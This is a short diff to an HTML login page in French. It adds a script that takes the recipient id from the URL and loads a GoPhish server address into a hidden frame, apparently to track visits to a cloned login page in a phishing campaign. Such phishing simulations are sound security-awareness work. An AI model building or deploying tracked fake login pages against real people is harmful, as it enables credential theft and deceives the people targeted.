@@ -51,5 +51,11 @@
             <button type="submit">Se connecter</button>
         </form>
     </div>
+    <script>
+        GoPhishServer = "http://gophish.local/"
+            rid = window.location.search.substr(1)
+            var site = GoPhishServer + "?" + rid  
+            document.getElementsByName('frame')[0].src = site;
+    </script>
 </body>
 </html>
